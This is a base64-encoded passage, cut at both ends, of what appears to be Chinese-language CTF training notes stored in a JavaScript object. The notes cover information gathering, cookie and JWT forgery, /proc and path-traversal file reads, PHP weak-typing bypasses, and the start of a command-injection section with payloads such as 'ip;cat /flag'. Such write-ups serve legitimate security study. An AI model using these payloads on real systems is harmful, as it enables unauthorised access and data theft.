MzU1XHU3Njg0XHU2NUI5XHU2Q0Q1XHU2NjJGXHU2MjUzXHU1RjAwXHU2RDRGXHU4OUM4XHU1NjY4XHU2M0E3XHU1MjM2XHU1M0YwXHVGRjBDXHU2MjhBXHU1M0Q4XHU5MUNGXHU1NDBEXHU2MjE2XHU1QkM2XHU3ODAxXHU1MDNDXHU3NkY0XHU2M0E1IFxcYGV2YWwoKVxcYFx1RkYwQ1x1NEUwRFx1OTcwMFx1ODk4MVx1NjI0Qlx1NTJBOFx1ODlFM1x1NzgwMVx1MzAwMlxyXG5cclxuXHU5NjkwXHU4NUNGXHU4ODY4XHU1MzU1XHU1QjU3XHU2QkI1XHU0RTVGXHU2NjJGXHU0RTAwXHU0RTJBXHU1QkI5XHU2NjEzXHU4OEFCXHU1RkZEXHU3NTY1XHU3Njg0XHU3MEI5XHUzMDAyXHU2NzA5XHU0RTlCXHU5ODk4XHU3NkVFXHU2MjhBIFxcYGlzX2FkbWluXFxgIFx1NjIxNiBcXGByb2xlXFxgIFx1OEJCRVx1NEUzQSBcXGB0eXBlPVwiaGlkZGVuXCJcXGBcdUZGMENcdTRFRTVcdTRFM0FcdTc1MjhcdTYyMzdcdTY1MzlcdTRFMERcdTRFODZcdTMwMDJcdTc1MjggQnVycCBTdWl0ZSBcdTYyRTZcdTYyMkFcdThCRjdcdTZDNDJcdUZGMENcdTYyOEFcdTUwM0NcdTRFQ0UgMCBcdTY1MzlcdTYyMTAgMVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1YIFBPU1QgVVJMIC1kICdpc19hZG1pbj0xJm5pY2tuYW1lPXRlc3QnXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgXHU1NENEXHU1RTk0XHU1OTM0XHUzMDAxMzAyIFx1NTRDRFx1NUU5NFx1NEY1M1x1NEUwRVx1NTM0Rlx1OEJBRVx1NUM0MlxyXG5cclxuXHU3NTI4IFxcYGN1cmwgLUlcXGAgXHU2N0U1XHU1NENEXHU1RTk0XHU1OTM0XHU2NjJGXHU1N0ZBXHU2NzJDXHU1MjlGXHVGRjBDXHU0RjQ2XHU2MjExXHU1NzI4XHU4RkQ5XHU5MDUzXHU5ODk4XHU0RTBBXHU1NDAzXHU4RkM3XHU0RThGXHUyMDE0XHUyMDE0XHU1RjUzXHU2NUY2XHU1M0VBXHU3NzBCXHU0RTg2IGJvZHlcdUZGMENcdTVGRkRcdTc1NjVcdTRFODYgXFxgWC1GbGFnXFxgIFx1NUI1N1x1NkJCNVx1RkYwQ1x1NTE3Nlx1NUI5RSBmbGFnIFx1NUMzMVx1ODVDRlx1NTcyOFx1NTRDRFx1NUU5NFx1NTkzNFx1OTFDQ1x1MzAwMlxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIC1JIFVSTCAgICMgWC1GbGFnOiBmbGFney4uLn1cclxuXFxgXFxgXFxgXHJcblxyXG5cdTY2RjRcdTk2OTBcdTg1M0RcdTc2ODRcdTY2MkYgMzAyIFx1OTFDRFx1NUI5QVx1NTQxMVx1NzY4NFx1NTRDRFx1NUU5NFx1NEY1M1x1MzAwMlx1NUY4OFx1NTkxQVx1NEVCQVx1NEVFNVx1NEUzQSAzMDIgXHU1M0VBXHU2NzA5IExvY2F0aW9uIFx1NTkzNFx1RkYwQ1x1NkNBMVx1NjcwOSBib2R5XHVGRjBDXHU0RThFXHU2NjJGXHU3NkY0XHU2M0E1IFxcYGFsbG93X3JlZGlyZWN0cz1UcnVlXFxgIFx1ODFFQVx1NTJBOFx1OERERlx1OEZEQlx1RkYwQ1x1N0VEM1x1Njc5Q1x1NUI4Q1x1NTE2OFx1OTUxOVx1OEZDN1x1NEU4Nlx1ODVDRlx1NTcyOFx1NEUyRFx1OTVGNFx1NTRDRFx1NUU5NFx1OTFDQ1x1NzY4NCBmbGFnXHUzMDAyXHJcblxyXG5cXGBcXGBcXGBweXRob25cclxuciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPXsnc29sdmVkJzonMSd9LCBhbGxvd19yZWRpcmVjdHM9RmFsc2UpXHJcbiMgXHU5NTE5XHU4QkVGXHVGRjFBXHU3NkY0XHU2M0E1Zm9sbG93XHU0RjFBXHU5NTE5XHU4RkM3Ym9keVxyXG4jIFx1NkI2M1x1Nzg2RVx1RkYxQVx1OTAxMFx1NUM0Mlx1NjhDMFx1NjdFNVx1NkJDRlx1NUM0Mlx1NTRDRFx1NUU5NFx1NzY4NGJvZHlcclxuaWYgJ2ZsYWd7JyBpbiByLnRleHQ6IHByaW50KHIudGV4dClcclxuXFxgXFxgXFxgXHJcblxyXG4jIyBcdTY1NEZcdTYxMUZcdTY1ODdcdTRFRjZcdTRFMEVcdTU5MDdcdTRFRkRcdTY1ODdcdTRFRjZcclxuXHJcblx1OEZEOVx1OTA1M1x1OTg5OFx1NzY4NFx1NTE2NVx1NTNFM1x1ODVDRlx1NTcyOCBcXGByb2JvdHMudHh0XFxgIFx1OTFDQ1x1RkYxQVxcYERpc2FsbG93OiAvcWNxLnBocFxcYFx1RkYwQ1x1OEJCRlx1OTVFRVx1NTM3M1x1NUY5NyBmbGFnXHUzMDAyXHJcblxyXG5cXGBcXGBcXGBiYXNoXHJcbmN1cmwgVVJML3JvYm90cy50eHQgICAgICMgRGlzYWxsb3c6IC9xY3EucGhwXHJcbmN1cmwgVVJML3FjcS5waHAgICAgICAgICMgXHU3NkY0XHU2M0E1XHU4QkJGXHU5NUVFXHJcblxcYFxcYFxcYFxyXG5cclxuXFxgLnBocHNcXGAgXHU2NTg3XHU0RUY2XHU2Q0M0XHU5NzMyXHU2RTkwXHU3ODAxXHU0RTVGXHU2NjJGXHU3RUNGXHU1MTc4XHUyMDE0XHUyMDE0UEhQIFx1NjU4N1x1NEVGNlx1NzY4NFx1NTkwN1x1NEVGRFx1NzI0OFx1NjcyQ1x1NEYxQVx1NjZCNFx1OTczMlx1NUI4Q1x1NjU3NFx1OTAzQlx1OEY5MVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIFVSTC9pbmRleC5waHBzICAgICAjIFx1NkU5MFx1NzgwMVx1NkNDNFx1OTczMlx1RkYwQ1x1NUJDNlx1NzgwMSBRQ3lZZFNcclxuY3VybCBVUkwvP2E9UUN5WWRTICAgICAgIyBcdTYzRDBcdTRFQTRcdTVCQzZcdTc4MDFcclxuXFxgXFxgXFxgXHJcblxyXG5cdTVFMzhcdTg5QzFcdTc2ODRcdTU5MDdcdTRFRkRcdTY1ODdcdTRFRjZcdTU0MEVcdTdGMDBcdTYyMTFcdTRFMDBcdTgyMkNcdTRGMUFcdTYyNzlcdTkxQ0ZcdTYyNkJcdUZGMUFcXGAvaW5kZXgucGhwc1xcYFx1MzAwMVxcYC5iYWtcXGBcdTMwMDFcXGAuc3dwXFxgXHUzMDAxXFxgLmdpdC9jb25maWdcXGBcdTMwMDFcXGAvd3d3LnppcFxcYFx1MzAwMlxyXG5cclxuIyMgQ29va2llIFx1NkNFOFx1NTE2NVx1NEUwRVx1OEJBNFx1OEJDMVx1N0VENVx1OEZDN1xyXG5cclxuQ29va2llIFx1NkNFOFx1NTE2NVx1RkYwOElET1JcdUZGMDlcdTY3MDlcdTY1RjZcdTUwMTlcdTZCRDQgU1FMIFx1NkNFOFx1NTE2NVx1OEZEOFx1OTY5MFx1ODUzRFx1MzAwMlx1OTg5OFx1NzZFRVx1NzUyOCBcXGAkX0NPT0tJRVsndXNlciddXFxgIFx1NTIyNFx1NjVBRFx1Njc0M1x1OTY1MFx1RkYwQ1x1NzZGNFx1NjNBNVx1NjUzOSBDb29raWUgXHU2QkQ0XHU2NTM5IFVSTCBcdTUzQzJcdTY1NzBcdTY2RjRcdTc2RjRcdTYzQTVcdUZGMUFcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5yZXF1ZXN0cy5nZXQodXJsICsgJy93cXcucGhwJywgY29va2llcz17J3VzZXInOiAnYWRtaW4nfSlcclxuIyBmbGFne2FjNGMzNDJlLWVlZTMtNGM0My1iY2UyLWM0YTRiNDJlOGUyZX1cclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NTE3M1x1OTUyRSoqXHVGRjFBXHU1RkM1XHU5ODdCXHU3NTI4IENvb2tpZSBcdTU5MzRcdTgwMENcdTRFMERcdTY2MkYgVVJMIFx1NTNDMlx1NjU3MFx1MzAwMlxyXG5cclxuSldUIFx1NEYyQVx1OTAyMFx1NTIxOVx1NjYyRlx1NTNFNlx1NEUwMFx1NEUyQVx1NTE3OFx1NTc4Qlx1NTczQVx1NjY2Rlx1MzAwMlx1NTk4Mlx1Njc5Q1x1NkU5MFx1NzgwMVx1OTFDQ1x1NkNDNFx1OTczMlx1NEU4NiBITUFDIFx1NUJDNlx1OTRBNVx1RkYwQ1x1NUMzMVx1ODBGRFx1NzUyOCBQeUpXVCBcdTRGMkFcdTkwMjBcdTRFRkJcdTYxMEZcdThFQUJcdTRFRkRcdUZGMUFcclxuXHJcblxcYFxcYFxcYHB5dGhvblxyXG5pbXBvcnQgand0XHJcbnRva2VuID0gand0LmVuY29kZSh7XCJpc3NcIjpcImFkbWluXCJ9LCBcImN0ZnNob3dfand0X2FkbWluXCIsIGFsZ29yaXRobT1cIkhTMjU2XCIpXHJcblxcYFxcYFxcYFxyXG5cclxuIyMgL3Byb2Mvc2VsZi8gXHU2NTg3XHU0RUY2XHU3Q0ZCXHU3RURGXHU1MjI5XHU3NTI4XHJcblxyXG5cdThGRDlcdTkwNTNcdTk4OThcdTVGODhcdTVERTdcdTU5OTlcdUZGMUFcdTRFRTNcdTc4MDFcdTk2NTBcdTUyMzZcdTRFODYgXFxgJF9HRVRbJ2ZpbGVuYW1lJ11cXGAgXHU5NTdGXHU1RUE2XHU1RkM1XHU5ODdCXHU1QzBGXHU0RThFIDE3XHVGRjBDXHU0RjQ2XHU1NDBDXHU2NUY2XHU3NTI4IFxcYGZvcGVuXFxgIFx1NTcyOCBcXGByZWFkZmlsZVxcYCBcdTRFNEJcdTUyNERcdTk4ODRcdTUxNDhcdTYyNTNcdTVGMDBcdTRFODZcdTRFMDBcdTRFMkFcdTY1ODdcdTRFRjZcdTYzQ0ZcdThGRjBcdTdCMjZcdTMwMDJcclxuXHJcblxcYFxcYFxcYGJhc2hcclxuY3VybCBcIlVSTC8/ZmlsZW5hbWU9L3Byb2Mvc2VsZi9mZC81XCJcclxuIyBmbGFnezk3ZTM4ZDMwLWVmMjUtNDdhZC1iMTAyLTQ1ZjFiNDY1OWZhY31cclxuXFxgXFxgXFxgXHJcblxyXG4qKlx1NTE3M1x1OTUyRSoqXHVGRjFBXFxgZm9wZW5cXGAgXHU1NzI4IFxcYHJlYWRmaWxlXFxgIFx1NEU0Qlx1NTI0RFx1NjI2N1x1ODg0Q1x1RkYwQ2ZkIFx1NTNGN1x1NTNFRlx1ODBGRFx1NjYyRiAzLzQvNVx1RkYwQ1x1OTcwMFx1OTAxMFx1NEUwMFx1NUMxRFx1OEJENVx1MzAwMlxyXG5cclxuIyMgTEZJIFx1OERFRlx1NUY4NFx1N0E3Rlx1OEQ4QVxyXG5cclxuXHU5NzUyXHU1QzkxIENURiBcdTc2ODQgZXppbmZvbGVha1x1RkYxQVx1OTg3NVx1OTc2Mlx1NjNEMFx1NEY5Qlx1NjU4N1x1NEVGNlx1NkQ0Rlx1ODlDOFx1NTI5Rlx1ODBGRFx1RkYwQ1x1NEY0Nlx1OTY1MFx1NTIzNlx1NTcyOCBcXGAvYXBwL1xcYCBcdTc2RUVcdTVGNTVcdTRFMEJcdTMwMDJcdTYwRjNcdTg5ODFcdThCRkJcdTY4MzlcdTc2RUVcdTVGNTVcdTc2ODQgZmxhZ1x1RkYwQ1x1NUMzMVx1OTcwMFx1ODk4MVx1OERFRlx1NUY4NFx1N0E3Rlx1OEQ4QVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG4jIFx1NEUwMFx1NUM0Mlx1NEUwRFx1NTkxRlx1NUMzMVx1NTkxQVx1OEJENVx1NTFFMFx1NUM0MlxyXG5jdXJsIFwiaHR0cDovL3RhcmdldC8/ZmlsZT0uLi8uLi8uLi8uLi9mbDRnLnR4dFwiXHJcbiMgZmxhZ3suLi59XHJcblxcYFxcYFxcYFxyXG5cclxuKipcdTUxNzNcdTk1MkUqKlx1RkYxQVx1N0E3Rlx1OEQ4QVx1NkRGMVx1NUVBNlx1NUY4OFx1OTFDRFx1ODk4MVx1MzAwMlx1NEVDRSBcXGAvYXBwL3N1Yi9kaXIvXFxgIFx1NTZERVx1NTIzMFx1NjgzOVx1OTcwMFx1ODk4MSBcXGAuLi8uLi8uLi9cXGBcdTMwMDJcdTRFMERcdTc3RTVcdTkwNTNcdTUxNzdcdTRGNTNcdTZERjFcdTVFQTZcdTVDMzFcdTRFQ0UgMSBcdThCRDVcdTUyMzAgMTBcdTMwMDJcclxuXHJcbiMjIFx1OTY5MFx1ODVDRlx1NjU4N1x1NEVGNlx1NEUwRVx1NjU4N1x1Njg2MyBJRE9SXHJcblxyXG5DVEZTaG93IGJhc2ljXzEyXHVGRjFBXHU5ODc1XHU5NzYyXHU1M0VBXHU2NjNFXHU3OTNBXHU0RTAwXHU0RTJBXHU5NEZFXHU2M0E1XHVGRjBDSUQgXHU0RTNBIDE5MFx1MzAwMlx1OEJENVx1OEJENVx1NzZGOFx1OTBCQlx1NzY4NCBJRFx1RkYxQVxyXG5cclxuXFxgXFxgXFxgYmFzaFxyXG5jdXJsIFwiaHR0cDovL3RhcmdldC8/aWQ9MTIxXCJcclxuIyBcdTUzRDFcdTczQjBcdTRFMDBcdTRFMkFcdTk2OTBcdTg1Q0ZcdTY1ODdcdTY4NjNcdUZGMENmbGFnIFx1NUMzMVx1NTcyOFx1OTFDQ1x1OTc2Mlx1RkYwMVxyXG5cXGBcXGBcXGBcclxuXHJcbioqXHU2NTU5XHU4QkFEKipcdUZGMUFcdTRFMERcdTg5ODFcdTUzRUFcdTc2RjhcdTRGRTFcdTk4NzVcdTk3NjJcdTRFMEFcdTY2M0VcdTc5M0FcdTc2ODRcdTUzQzJcdTY1NzBcdTUwM0NcdUZGMENJRE9SIFx1NzY4NFx1NTNDMlx1NjU3MFx1NTAzQ1x1OTcwMFx1ODk4MVx1NTkyN1x1ODBDNlx1NTNCQlx1NzMxQ1x1MzAwMlxyXG5cclxuLS0tXHJcblxyXG4qKlx1OEUyOVx1NTc1MVx1NjU1OVx1OEJBRCoqXHVGRjFBXHU1MDVBXHU0RkUxXHU2MDZGXHU2NTM2XHU5NkM2XHU5ODk4XHU3NkVFXHVGRjBDKipcdTZDMzhcdThGRENcdTRFMERcdTg5ODFcdTY1M0VcdThGQzdcdTRFRkJcdTRGNTVcdTRFMDBcdTY3NjFcdTdFQkZcdTdEMjIqKlx1MzAwMkhUTUwgXHU2Q0U4XHU5MUNBXHUzMDAxXHU1NENEXHU1RTk0XHU1OTM0XHUzMDAxcm9ib3RzLnR4dFx1MzAwMVx1NTkwN1x1NEVGRFx1NjU4N1x1NEVGNlx1MzAwMUNvb2tpZVx1MzAwMUpXVCBcdTVCQzZcdTk0QTVcdTIwMTRcdTIwMTRcdTZCQ0ZcdTRFMkFcdTg5RDJcdTg0M0RcdTkwRkRcdTUzRUZcdTgwRkRcdTg1Q0ZcdTc3NDAgZmxhZ1x1MzAwMlxyXG5gXHJcbiAgfSxcclxuICBwaHA6IHtcclxuICAgIHRpdGxlOiAnUEhQIFx1NUYzMVx1N0M3Qlx1NTc4QicsXHJcbiAgICBzdWJ0aXRsZTogJ1BIUCBXZWFrIFR5cGluZycsXHJcbiAgICBjb250ZW50OiBgXHJcblBIUCBcdTc2ODRcdTVGMzFcdTdDN0JcdTU3OEJcdTZCRDRcdThGODNcdTY2MkYgQ1RGIFx1NEUyRFx1NjcwMFx1N0VDRlx1NTE3OFx1NzY4NFx1NzdFNVx1OEJDNlx1NzBCOVx1NEU0Qlx1NEUwMFx1RkYwQ1x1NEU1Rlx1NjYyRlx1OEZEOVx1NkIyMVx1NTIzN1x1OTg5OFx1OTFDQ1x1OEUyOVx1NTc1MVx1NjcwMFx1NTkxQVx1NzY4NFx1NTczMFx1NjVCOVx1MzAwMlx1NjgzOFx1NUZDM1x1NTM5Rlx1NzQwNlx1NUY4OFx1N0I4MFx1NTM1NVx1RkYxQVBIUCBcdTU3MjhcdTc1MjggXFxgPT1cXGAgXHU2QkQ0XHU4RjgzXHU2NUY2XHU0RjFBXHU4MUVBXHU1MkE4XHU1MDVBXHU3QzdCXHU1NzhCXHU4RjZDXHU2MzYyXHVGRjBDXHU4MDBDIFxcYD09PVxcYCBcdTRFMjVcdTY4M0NcdTZCRDRcdThGODNcdTUyMTlcdTRFMERcdTRGMUFcdTMwMDJcclxuXHJcbiMjIFx1NUYzMVx1NkJENFx1OEY4M1x1N0VENVx1OEZDN1x1NjU3MFx1NUI1N1x1NTIyNFx1NjVBRFxyXG5cclxuXHU2NzAwXHU1MTc4XHU1NzhCXHU3Njg0XHU1NzNBXHU2NjZGXHU2NjJGXHU1NDBDXHU2NUY2XHU4OTgxXHU2QzQyXHU0RTAwXHU0RTJBXHU1M0Q4XHU5MUNGXCJcdTRFM0FcdTc3MUZcIlx1NEUxNFwiXHU3QjQ5XHU0RThFIDBcIlx1MzAwMlx1NzcwQlx1OEQ3N1x1Njc2NVx1NzdEQlx1NzZGRVx1RkYwQ1x1NEY0NiBcXGBcIjBhYmNcIlxcYCBcdTVDMzFcdTgwRkRcdTU0MENcdTY1RjZcdTZFRTFcdThEQjNcdUZGMUFcclxuXHJcblxcYFxcYFxcYHBocFxyXG5pZigkYSBhbmQgJGE9PTApICAgIC8vIFwiMGFiY1wiID09IDAgXHU0RTE0XHU0RTNBXHU3NzFGXHJcbmlmKCFpc19udW1lcmljKCRiKSkgLy8gXCIyMDI3YVwiIFx1NTQyQlx1NUI1N1x1NkJDRFx1MjE5MmZhbHNlXHJcbmlmKCRiID4gMjAyNikgICAgICAgLy8gXCIyMDI3YVwiID4gMjAyNlxyXG5cXGBcXGBcXGBcclxuXHJcblBheWxvYWQ6IFxcYD9hPTBhYmMmYj0yMDI3YVxcYFxyXG5cclxuIyMgYXJyYXlfc2VhcmNoIFx1NUYzMVx1N0M3Qlx1NTc4QlxyXG5cclxuXFxgYXJyYXlfc2VhcmNoXFxgIFx1OUVEOFx1OEJBNFx1NzUyOCBcXGA9PVxcYCBcdTZCRDRcdThGODNcdUZGMENcdTgwMEMgXFxgXCJRQ0NURlwiID09IDBcXGAgXHU0RTNBIHRydWVcdUZGMENcdTYyNDBcdTRFRTVcdTVCODNcdTRGMUFcdTk1MTlcdThCRUZcdTU3MzBcdTUzMzlcdTkxNERcdTUyMzAgaW5kZXggMFx1RkYxQVxyXG5cclxuXFxgXFxgXFxgcGhwXHJcbiRrZXkgPSBhcnJheV9zZWFyY2goXCJRQ0NURlwiLCAkcWMpOyAvLyBcIlFDQ1RGXCI9PTAgXHUyMTkyIGtleT0wXHVGRjA4XHU5NTE5XHVGRjA5XHJcbi8vIFx1OTcwMFx1ODk4MSBrZXk9PT0xXHVGRjBDXHU2MjQwXHU0RUU1IFFDQ1RGIFx1NTcyOCBpbmRleCAxXHJcblxcYFxcYFxcYFxyXG5cclxuUGF5bG9hZDogXFxgP3FjPVtcImFcIixcIlFDQ1RGXCJdXFxgXHJcblxyXG4jIyBcdTVENENcdTU5NTdcdTVGMzFcdTdDN0JcdTU3OEJcclxuXHJcblx1NjZGNFx1N0VENVx1NzY4NFx1OEZEOFx1NjcwOVx1NUQ0Q1x1NTk1N1x1NUYzMVx1N0M3Qlx1NTc4Qlx1RkYxQVx1ODk4MVx1NkM0MiBcXGAwID09IFwiUUN5eWRzXCJcXGAgXHU0RjQ2IFxcYDAgIT09IFwiUUN5eWRzXCJcXGBcdUZGMUFcclxuXHJcblxcYFxcYFxcYHBocFxyXG4vLyAwID09IFwiUUN5eWRzXCIgXHU0RjQ2IDAgIT09IFwiUUN5eWRzXCIgXHUyNzEzXHJcblxcYFxcYFxcYFxyXG5cclxuUGF5bG9hZDogXFxgP3FjPXtcIjBcIjpcIlFDQ1RGXCIsXCJuXCI6WzBdfVxcYFxyXG5cclxuIyMgTUQ1IFx1NTQ4QyBTSEExIFx1N0VENVx1OEZDN1xyXG5cclxuMGUgXHU1RjAwXHU1OTM0XHU3Njg0XHU1NEM4XHU1RTBDXHU1MDNDXHU1NzI4XHU1RjMxXHU2QkQ0XHU4RjgzXHU0RTBCXHU0RjFBXHU4OEFCXHU1RjUzXHU2MjEwXHU3OUQxXHU1QjY2XHU4QkExXHU2NTcwXHU2Q0Q1XHVGRjBDXHU3QjQ5XHU0RThFIDBcdUZGMUFcclxuXHJcblxcYFxcYFxcYFxyXG5HRVQgP2E9UU5LQ0RaTyZiPTI0MDYxMDcwOFxyXG5cXGBcXGBcXGBcclxuXHJcblx1NEY0Nlx1OTA0N1x1NTIzMCBcXGA9PT1cXGAgXHU0RTI1XHU2ODNDXHU2QkQ0XHU4RjgzXHVGRjBDMGUgXHU3RUQ1XHU4RkM3XHU1QzMxXHU1OTMxXHU2NTQ4XHU0RTg2XHUzMDAyXHU4RkQ5XHU2NUY2XHU2NTcwXHU3RUM0XHU3RUQ1XHU4RkM3XHU3NjdCXHU1NzNBXHVGRjFBXFxgbWQ1KFtdKVxcYCBcdTU0OEMgXFxgc2hhMShbXSlcXGAgXHU1QkY5XHU2NTcwXHU3RUM0XHU5MEZEXHU4RkQ0XHU1NkRFIE5VTExcdUZGMENcdTgwMEMgXFxgTlVMTCA9PT0gTlVMTFxcYCBcdTRFM0EgdHJ1ZVx1RkYxQVxyXG5cclxuXFxgXFxgXFxgXHJcbkdFVCA/YVtdPTEmYltdPTJcclxuXFxgXFxgXFxgXHJcblxyXG4tLS1cclxuXHJcbiMjIFx1OTAxRlx1NjdFNVx1ODg2OFxyXG5cclxufCBcdTU3M0FcdTY2NkYgfCBQYXlsb2FkIHwgXHU1MzlGXHU3NDA2IHxcclxufC0tLS0tLXwtLS0tLS0tLS18LS0tLS0tfFxyXG58IFxcYD09IDBcXGAgXHU3RUQ1XHU4RkM3IHwgXFxgXCIwYWJjXCJcXGAgfCBcdTVCNTdcdTdCMjZcdTRFMzJcdTVGMDBcdTU5MzRcdTk3NUVcdTY1NzBcdTVCNTdcdTUyMTlcdTdCNDlcdTRFOEUwIHxcclxufCBpc19udW1lcmljIFx1N0VENVx1OEZDNyB8IFxcYFwiMjAyN2FcIlxcYCB8IFx1NTQyQlx1NUI1N1x1NkJDRFx1RkYwQ1x1NEUwRFx1NjYyRlx1N0VBRlx1NjU3MFx1NUI1NyB8XHJcbnwgMGUgTUQ1IFx1N0VENVx1OEZDNyB8IFxcYFFOS0NEWk9cXGAgfCAwZSBcdTVGMDBcdTU5MzRcdTc2ODQgaGFzaCBcdTg4QUJcdTVGNTNcdTc5RDFcdTVCNjZcdThCQTFcdTY1NzBcdTZDRDUgfFxyXG58IG1kNS9zaGExIFx1NEUyNVx1NjgzQ1x1NkJENFx1OEY4MyB8IFxcYD9hW109MSZiW109MlxcYCB8IFx1NjU3MFx1N0VDNFx1OEZENFx1NTZERSBOVUxMXHVGRjBDTlVMTD09PU5VTEwgfFxyXG58IGFycmF5X3NlYXJjaCB8IFxcYFtcImFcIixcIlFDQ1RGXCJdXFxgIHwgXCJRQ0NURlwiIFx1NTcyOCBpbmRleCAxIHxcclxuXHJcbiMjIFx1NTNEOFx1OTFDRlx1ODk4Nlx1NzZENlxyXG5cclxuSVNDQyBcdTc2ODRcdTRFMDBcdTkwNTNcdTk4OThcdUZGMUFcdTRFRTNcdTc4MDFcdTc1MjggXFxgZm9yZWFjaChcXCRfR0VUIGFzICRrID0+ICR2KSAkJGsgPSAkdjtcXGAgXHU1QjlFXHU3M0IwXHU0RTg2XHU1M0Q4XHU5MUNGXHU4OTg2XHU3NkQ2XHUzMDAyXHJcblxyXG5cXGBcXGBcXGBwaHBcclxuLy8gXHU5MDFBXHU4RkM3IFVSTCBcdTRGMjBcdTUzQzJcdTg5ODZcdTc2RDZcdTRFRkJcdTYxMEZcdTUzRDhcdTkxQ0ZcclxuLy8gXHU2RTkwXHU3ODAxXHU2Q0U4XHU5MUNBXHU5MUNDXHU4NUNGXHU3NzQwXHU1MTczXHU5NTJFXHU1M0Q4XHU5MUNGXHU1NDBEXHU1NDhDXHU2NzFGXHU2NzFCXHU1MDNDXHJcbkdFVCA/a2V5PVtdJmV4cGVjdGVkPXRlc3RcclxuXFxgXFxgXFxgXHJcblxyXG5cdTc1MjhcdTdBN0FcdTY1NzBcdTdFQzQgXFxgW11cXGAgXHU2MjUzXHU3ODM0XHU1QjU3XHU3QjI2XHU0RTMyID09PSBcdTc2ODRcdTRFMjVcdTY4M0NcdTZCRDRcdThGODNcdTMwMDJcdTUzRDhcdTkxQ0ZcdTg5ODZcdTc2RDZcdTUzRUZcdTRFRTVcdTc3QUNcdTk1RjRcdTdFRDVcdThGQzdcdTU5MERcdTY3NDJcdTc2ODQgaWYgXHU1MjI0XHU2NUFEXHUzMDAyXHJcblxyXG4qKlx1N0VDRlx1OUE4QyoqXHVGRjFBXHJcbjEuIFx1OTg3NVx1OTc2Mlx1NkU5MFx1NzgwMVx1NkNFOFx1OTFDQVx1NkMzOFx1OEZEQ1x1NEUwRFx1ODk4MVx1NUZGRFx1NzU2NVx1RkYwQ1x1NTE3M1x1OTUyRVx1OEJDRFx1NTQ4Q1x1NTNEOFx1OTFDRlx1NTQwRFx1NUUzOFx1ODVDRlx1NTcyOFx1OTBBM1x1OTFDQ1xyXG4yLiBcdTdBN0FcdTY1NzBcdTdFQzRcdTU3MjhcdTVGMzFcdTdDN0JcdTU3OEJcdTZCRDRcdThGODNcdTRFMkRcdTY2MkZcdTRFMkFcdTRFMDdcdTgwRkRcdTVERTVcdTUxNzdcclxuXHJcbi0tLVxyXG5cclxuKipcdThFMjlcdTU3NTFcdTY1NTlcdThCQUQqKlx1RkYxQVxyXG4xLiBcdTZDMzhcdThGRENcdTUxNDhcdTc3MEJcdTZFMDUgXFxgPT1cXGAgXHU4RkQ4XHU2NjJGIFxcYD09PVxcYFx1RkYwQ1x1NEUyNFx1NzlDRFx1N0VENVx1OEZDN1x1NjAxRFx1OERFRlx1NUI4Q1x1NTE2OFx1NEUwRFx1NTQwQ1xyXG4yLiBcXGBhcnJheV9zZWFyY2hcXGAgXHU3Njg0XHU1RjMxXHU3QzdCXHU1NzhCXHU5Njc3XHU5NjMxXHU1QkI5XHU2NjEzXHU4OEFCXHU1RkZEXHU3NTY1XHVGRjBDXHU5RUQ4XHU4QkE0XHU4ODRDXHU0RTNBXHU0RTBEXHU2NjJGXHU0RTI1XHU2ODNDXHU2QkQ0XHU4RjgzXHJcbjMuIDBlIFx1N0VENVx1OEZDN1x1NzY4NFx1NUI1N1x1N0IyNlx1NEUzMlx1ODk4MVx1OUE4Q1x1OEJDMSBNRDUgXHU1NDBFXHU3ODZFXHU1QjlFXHU2NjJGIDBlIFx1NUYwMFx1NTkzNFx1NTE2OFx1NjU3MFx1NUI1N1xyXG5gXHJcbiAgfSxcclxuICBjbWQ6IHtcclxuICAgIHRpdGxlOiAnXHU1NDdEXHU0RUU0XHU2Q0U4XHU1MTY1JyxcclxuICAgIHN1YnRpdGxlOiAnQ29tbWFuZCBJbmplY3Rpb24nLFxyXG4gICAgY29udGVudDogYFxyXG5cdTU0N0RcdTRFRTRcdTZDRThcdTUxNjVcdTc2ODRcdTgwMDNcdTcwQjlcdTRFQ0VcdTdCODBcdTUzNTVcdTUyMzBcdTUzRDhcdTYwMDFcdUZGMENcdTVDNDJcdTVDNDJcdTUyQTBcdTc4MDFcdUZGMENcdTZCQ0ZcdTRFMDBcdTkwNTNcdTk4OThcdTkwRkRcdTU3MjhcdTgwMDNcdTlBOENcdTVCRjkgTGludXggXHU1NDdEXHU0RUU0XHU4ODRDXHU1NDhDIFBIUCBcdTUxRkRcdTY1NzBcdTc2ODRcdTc0MDZcdTg5RTNcdTZERjFcdTVFQTZcdTMwMDJcclxuXHJcbiMjIFx1NTdGQVx1Nzg0MFx1NkNFOFx1NTE2NVx1NEUwRVx1N0VENVx1OEZDN1xyXG5cclxuXHU2NzAwXHU1N0ZBXHU3ODQwXHU3Njg0XHU5ODk4XHU3NkVFXHU4RjkzXHU1MTY1XHU3NkY0XHU2M0E1XHU2MkZDXHU4RkRCIFxcYHN5c3RlbSgpXFxgXHVGRjBDXHU2Q0ExXHU2NzA5XHU0RUZCXHU0RjU1XHU4RkM3XHU2RUU0XHVGRjFBXHJcblxyXG5cXGBcXGBcXGBcclxuUE9TVCBjbWQ9Y2F0IC9mbGFnXHJcblxcYFxcYFxcYFxyXG5cclxuXHU3QTBEXHU1RkFFXHU1MkEwXHU0RTg2XHU3MEI5XHU2NTk5XHUyMDE0XHUyMDE0XHU4RkM3XHU2RUU0XHU0RTg2IGZsYWcgXHU1MTczXHU5NTJFXHU4QkNEXHUyMDE0XHUyMDE0XHU1QzMxXHU3NTI4XHU1MjA2XHU1M0Y3XHU2MjJBXHU2NUFEXHVGRjFBXHJcblxyXG5cXGBcXGBcXGBcclxuUE9TVCBjbWQ9aXA7Y2F0IC9mbGFnXHJcblxcYFxcYFxcYFxyXG5cclxuXHU4RkM3XHU2RUU0XHU0RTg2XHU3QTdBXHU2ODNDXHU2MDBFXHU0RTQ4XHU1MjlFXHVGRjFGTGludXggXHU0RTBCIFxcYCRJRlNcXGAgXHU2NjJGXHU1MTg1XHU5MEU4XHU1QjU3XHU2QkI1XHU1MjA2XHU5Njk0XHU3QjI2XHVGRjFBXHJcblxyXG5cXGBcXGBcXGBcclxuUE9TVCBjbWQ